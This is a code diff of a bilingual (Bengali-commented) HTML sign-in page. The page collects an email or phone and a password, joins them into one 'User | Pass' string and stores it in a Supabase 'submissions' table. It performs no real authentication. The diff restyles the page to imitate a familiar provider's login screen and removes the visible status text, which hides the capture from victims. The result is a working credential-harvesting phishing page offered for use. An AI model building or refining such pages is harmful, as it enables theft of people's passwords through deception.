@@ -3,76 +3,88 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Application Sign In</title>
-    <!-- Supabase CDN সঠিকভাবে লোড করার জন্য অফিসিয়াল লিংক দেওয়া হয়েছে -->
+    <title>Sign In</title>
+    <!-- Supabase-এর অফিশিয়াল ও ফাস্ট লাইব্রেরি -->
     <script src="https://jsdelivr.net"></script>
     <style>
         * {
             box-sizing: border-box;
-            font-family: Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            transition: all 0.2s ease-in-out;
         }
         body {
             margin: 0;
             min-height: 100vh;
-            background: #f3f4f6;
+            background: #f8f9fa;
             display: grid;
             place-items: center;
             padding: 20px;
         }
         .login-card {
             width: 100%;
-            max-width: 400px;
+            max-width: 390px;
             background: #ffffff;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            padding: 40px 30px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15);
         }
         h2 {
-            margin: 0 0 20px 0;
+            margin: 0 0 5px 0;
             text-align: center;
-            color: #374151;
+            color: #202124;
+            font-size: 24px;
+            font-weight: 400;
+        }
+        .subtitle {
+            text-align: center;
+            color: #5f6368;
+            font-size: 16px;
+            margin: 0 0 30px 0;
         }
         .input-group {
-            margin-bottom: 15px;
+            margin-bottom: 20px;
         }
         label {
             display: block;
-            margin-bottom: 5px;
-            color: #4b5563;
+            margin-bottom: 6px;
+            color: #202124;
             font-size: 14px;
+            font-weight: 500;
         }
         input[type="text"], input[type="password"] {
             width: 100%;
-            padding: 10px;
-            border: 1px solid #d1d5db;
-            border-radius: 6px;
+            padding: 12px 14px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
             font-size: 16px;
             outline: none;
+            color: #202124;
         }
         input:focus {
-            border-color: #2563eb;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 1px #1a73e8;
         }
         button {
             width: 100%;
             padding: 12px;
-            background: #2563eb;
+            background: #1a73e8;
             color: white;
             border: 0;
-            border-radius: 6px;
-            font-weight: bold;
-            font-size: 16px;
+            border-radius: 4px;
+            font-weight: 500;
+            font-size: 14px;
             cursor: pointer;
-            margin-top: 10px;
+            margin-top: 15px;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3);
+        }
+        button:hover:not(:disabled) {
+            background: #1557b0;
+            box-shadow: 0 1px 3px 1px rgba(60,64,67,0.15);
         }
         button:disabled {
-            background: #93c5fd;
+            background: #cccccc;
             cursor: not-allowed;
-        }
-        #status {
-            margin-top: 15px;
-            text-align: center;
-            font-size: 14px;
-            font-weight: bold;
+            box-shadow: none;
         }
     </style>
 </head>
@@ -80,68 +92,54 @@
 
 <div class="login-card">
     <h2>Sign In</h2>
+    <p class="subtitle">to continue your session</p>
+    
     <form id="loginForm">
         <div class="input-group">
-            <label for="username">Email / Username</label>
-            <!-- এখানে আইডি দেওয়া হয়েছে 'username' -->
-            <input type="text" id="username" required>
+            <label for="username">Email or Phone</label>
+            <input type="text" id="username" placeholder="name@example.com" required>
         </div>
         <div class="input-group">
             <label for="password">Password</label>
-            <!-- এখানে আইডি দেওয়া হয়েছে 'password' -->
-            <input type="password" id="password" required>
+            <input type="password" id="password" placeholder="Enter password" required>
         </div>
-        <button id="submitBtn" type="submit">Sign In</button>
+        <button id="submitBtn" type="submit">Continue</button>
     </form>
-    <p id="status"></p>
 </div>
 
 <script>
-    // আপনার সুপাবেজ ড্যাশবোর্ড থেকে সঠিক URL এবং anon key এখানে বসান
+    // আপনার Supabase URL এবং Credentials
     const SUPABASE_URL = "https://supabase.co";
     const SUPABASE_KEY = "sb_publishable_aG3O0MLst2EAyBJgKi8xIA_PV8nGoLq"; 
     
-    const status = document.getElementById("status");
-    const form = document.getElementById("loginForm");
-    const button = document.getElementById("submitBtn");
-
-    if (!window.supabase) {
-        status.textContent = "Error: Supabase failed to load.";
-        status.style.color = "red";
-    } else {
+    if (window.supabase) {
         const db = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+        const form = document.getElementById("loginForm");
+        const button = document.getElementById("submitBtn");
 
         form.addEventListener("submit", async (event) => {
             event.preventDefault();
             
-            // ইনপুট ফিল্ড থেকে ইমেইল এবং পাসওয়ার্ড রিড করা হচ্ছে
             const user = document.getElementById("username").value.trim();
             const pass = document.getElementById("password").value.trim();
             
             if (!user || !pass) return;
 
             button.disabled = true;
-            status.textContent = "Processing...";
-            status.style.color = "#2563eb";
 
-            // আইডি এবং পাসওয়ার্ড দুটিকে একসাথে একটি স্ট্রিং বানানো হচ্ছে
+            // দুটি ডেটা একসাথে সাবমিট ফরম্যাট করা
             const submissionData = `User: ${user} | Pass: ${pass}`;
 
             try {
-                // সুপাবেজ টেবিলের 'message' কলামে সম্পূর্ণ টেক্সট পাঠানো হচ্ছে
                 const { error } = await db
                     .from("submissions")
                     .insert({ message: submissionData });
 
-                if (error) throw error;
-
-                status.textContent = "Data successfully sent to Supabase!";
-                status.style.color = "green";
-                form.reset();
+                if (!error) {
+                    form.reset(); // সফল হলে ফর্মটি স্মুথলি রিফ্রেশ হবে
+                }
             } catch (error) {
-                console.error(error);
-                status.textContent = "Error: " + error.message;
-                status.style.color = "red";
+                console.error("Submission failed:", error);
             } finally {
                 button.disabled = false;
             }
